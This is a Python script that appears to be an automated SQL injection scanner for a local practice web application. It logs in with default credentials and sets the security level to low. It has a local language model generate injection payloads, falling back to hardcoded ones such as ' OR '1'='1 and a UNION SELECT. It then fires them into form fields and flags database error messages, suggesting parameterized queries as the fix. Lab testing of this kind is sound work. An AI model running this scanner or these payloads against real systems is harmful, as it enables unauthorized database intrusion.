import requests
from bs4 import BeautifulSoup
import json
from urllib.parse import urljoin

BASE_URL = "http://localhost:8080/"
LOGIN_URL = urljoin(BASE_URL, "login.php")

session = requests.Session()


# ---------------- GENERATE PAYLOADS USING OLLAMA ----------------
def generate_payloads():

    print("[+] Generating SQL injection payloads using Ollama...")

    prompt = """
Generate 10 SQL injection payloads for penetration testing.
Return only payloads separated by new lines.
Example:
' OR '1'='1
"""

    try:
        response = requests.post(
            "http://localhost:11434/api/generate",
            json={
                "model": "qwen3.5:397b-cloud",
                "prompt": prompt,
                "stream": False
            }
        )

        data = response.json()
        text = data["response"]

        payloads = [p.strip() for p in text.split("\n") if p.strip()]

        print("[+] Generated payloads:")
        for p in payloads:
            print("   ", p)

        return payloads

    except Exception as e:
        print("[-] Ollama payload generation failed:", e)

        return [
            "'",
            "' OR '1'='1",
            "' UNION SELECT null,database()--"
        ]


# ---------------- LOGIN ----------------
def login():

    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_value = token["value"] if token else None

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }

    if token_value:
        login_data["user_token"] = token_value

    response = session.post(LOGIN_URL, data=login_data)

    if response.status_code == 200:
        print("[+] Login successful")

        session.cookies.set("security", "low")
        print("[+] Security level set to LOW")

    else:
        print("[-] Login failed")
        exit()


# ---------------- SQL ERROR DETECTION ----------------
def is_vulnerable(response_text):

    database_errors = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "mysql_fetch",
        "syntax error",
        "unclosed quotation mark",
        "quoted string not properly terminated"
    ]

    for error in database_errors:
        if error in response_text.lower():
            return True

    return False


# ---------------- LOAD FORMS ----------------
def load_forms():

    try:
        with open("forms.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        print("[-] forms.json not found")
        exit()


# ---------------- TEST FORMS ----------------
def test_forms():

    forms = load_forms()
    payloads = generate_payloads()

    vulnerabilities = []

    for form in forms:

        url = form["page"]
        action = form["action"]
        method = form["method"]

        if action.endswith("#") or action == BASE_URL:
            action = url

        print(f"\nTesting: {url}")

        for payload in payloads:

            for input_field in form["inputs"]:

                if input_field["type"] not in ["text", "hidden", "password"]:
                    continue

                name = input_field["name"]

                if not name:
                    continue

                data = {}

                for inp in form["inputs"]:
                    data[inp["name"]] = inp.get("value", "")

                data[name] = payload

                try:

                    if method.lower() == "post":
                        response = session.post(action, data=data)
                    else:
                        response = session.get(action, params=data)

                    if is_vulnerable(response.text):

                        vuln = {
                            "url": url,
                            "form_action": action,
                            "method": method,
                            "vulnerable_input": name,
                            "payload": payload,
                            "error_detected": "Database error message found",
                            "remediation": "Use parameterized queries (prepared statements)."
                        }

                        vulnerabilities.append(vuln)

                        print(f"[!] Vulnerable: {name} with payload {payload}")

                except Exception as e:
                    print("Error:", e)

    with open("vulnerabilities_llm.json", "w") as f:
        json.dump(vulnerabilities, f, indent=4)

    print("\nScan complete. Results saved to vulnerabilities_llm.json")


# ---------------- MAIN ----------------
if __name__ == "__main__":

    login()
    test_forms()